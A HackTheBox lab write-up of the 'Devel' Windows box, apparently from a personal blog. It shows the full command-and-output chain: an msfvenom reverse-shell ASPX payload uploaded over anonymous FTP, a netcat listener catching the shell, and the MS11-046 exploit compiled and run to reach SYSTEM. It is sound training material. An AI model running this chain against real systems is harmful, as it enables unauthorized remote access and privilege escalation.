---
layout: page
title: Devel
description: Devel from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/devel/logo.png" title="HTB Devel Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Devel">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Lazy devs make for easy boxes.  Welcome to Devel.

Run nmap to discover the ports running on the server.  Notice that anonymous login is allowed on the FTP.  Further, the directory listing looks like the root folder of the website.  Neat.

{% raw %}
```sh
└──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 07:18 CST
Nmap scan report for 10.10.10.5
Host is up (0.098s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png

<snip>
```
{% endraw %}

<br />
Generate an aspx msfvenom payload.

<ul>
<li>-p Set the payload for the windows machine</li>
<li>LHOST=The IP of the tun0 interface</li>
<li>LPORT=The port you want to connect to</li>
<li>-f The format that you want the exploit</li>
<li>-o The name of the file that the file will be called</li>
</ul>

{% raw %}
```sh
└──╼ [★]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2713 bytes
Saved as: rev.aspx
```
{% endraw %}

<br />
Use the ftp service with the anonymous account and transfer the exploit file to victim machine.

{% raw %}
```sh
└──╼ [★]$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put rev.aspx
local: rev.aspx remote: rev.aspx
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************|  2751       13.73 MiB/s    --:-- ETA
226 Transfer complete.
2751 bytes sent in 00:00 (27.34 KiB/s)
```
{% endraw %}

<br />
Start a listener listening on the LPORT that was chosen in the msfvenom exploit.

{% raw %}
```sh
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
```
{% endraw %}

<br />
In the web browser, navigate to the aspx that we just transfer.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/devel/browser.png" title="Navigate in the Browser" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```sh
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.5] 49161
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```
{% endraw %}

<br />
Run whoami just to test the command execution and see who we are.

{% raw %}
```sh
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```
{% endraw %}

<br />
Run systeminfo to get a sense of the system that we are on.

{% raw %}
```sh
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          17/1/2025, 3:14:31 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2645 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.470 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.552 MB
Virtual Memory: In Use:    589 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::c83:f455:7b23:2631
                                 [03]: dead:beef::b8f4:f25d:3375:9e52
                                 [04]: dead:beef::c83:f455:7b23:2631
```
{% endraw %}

<br />
This version of Windows if vulnerable to MS11-046.  Read up on the vulnerability.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/devel/bulletin.png" title="Microsoft Bulletin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046">Bulletin</a>

<br />
Perform further research to find an exploit for this particular vulnerability.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/devel/exploit.png" title="Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/40564">Bulletin</a>

<br />
Download the exploit into the local working folder.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/devel]
└─$ wget https://www.exploit-db.com/raw/40564 -O MS11-046.c                                 
--2025-01-18 22:56:53--  https://www.exploit-db.com/raw/40564
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘MS11-046.c’

MS11-046.c                                                     [  <=>                                                                                                                                    ]  31.91K   112KB/s    in 0.3s    

2025-01-18 22:56:54 (112 KB/s) - ‘MS11-046.c’ saved [32674]
```
{% endraw %}

<br />
Cross-compile the exploit for the Windows machine.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/devel]
└─$ i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/devel]
└─$ ls
MS11-046.c  MS11-046.exe
```
{% endraw %}

<br />
Log into the FTP server and change into binary mode.

{% raw %}
```sh
└──╼ [★]$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
```
{% endraw %}

<br />
Microsoft recommends binary mode for sending executables.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/devel/msftp.png" title="Microsoft FTP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp-binary">Bulletin</a>

<br />
Put the MS11-046.exe binary executable onto the victim server.

{% raw %}
```sh
ftp> put MS11-046.exe
local: MS11-046.exe remote: MS11-046.exe
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************|   234 KiB  340.43 KiB/s    00:00 ETA
226 Transfer complete.
240005 bytes sent in 00:00 (297.90 KiB/s)
```
{% endraw %}

<br />

<br />
Navigate to the webroot and execute the binary.

{% raw %}
```sh
C:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\inetpub\wwwroot

17/01/2025  04:27 ��    <DIR>          .
17/01/2025  04:27 ��    <DIR>          ..
18/03/2017  01:06 ��    <DIR>          aspnet_client
17/03/2017  04:37 ��               689 iisstart.htm
17/01/2025  04:27 ��           240.005 MS11-046.exe
17/01/2025  04:19 ��             2.760 rev.aspx
17/03/2017  04:37 ��           184.946 welcome.png
               4 File(s)        428.400 bytes
               3 Dir(s)   5.031.374.848 bytes free

C:\inetpub\wwwroot>MS11-046.exe
MS11-046.exe
```
{% endraw %}

<br />
Run whoami to confirm that we are SYSTEM.

{% raw %}
```sh
c:\Windows\System32>whoami
whoami
nt authority\system
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
C:\Users\babis\Desktop>type user.txt
type user.txt
<redacted>

C:\Users\babis\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::3c76:3140:5f71:34a2
   Temporary IPv6 Address. . . . . . : dead:beef::c9e0:845d:c742:b8af
   Link-local IPv6 Address . . . . . : fe80::3c76:3140:5f71:34a2%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.5
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6def%15
                                       10.10.10.2

Tunnel adapter isatap.{0B2931D6-69F8-4A00-8E64-237C531D469C}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<redracted>

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::3c76:3140:5f71:34a2
   Temporary IPv6 Address. . . . . . : dead:beef::c9e0:845d:c742:b8af
   Link-local IPv6 Address . . . . . : fe80::3c76:3140:5f71:34a2%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.5
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6def%15
                                       10.10.10.2

Tunnel adapter isatap.{0B2931D6-69F8-4A00-8E64-237C531D469C}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```
{% endraw %}

<br />
I look forward to seeing you in the next one.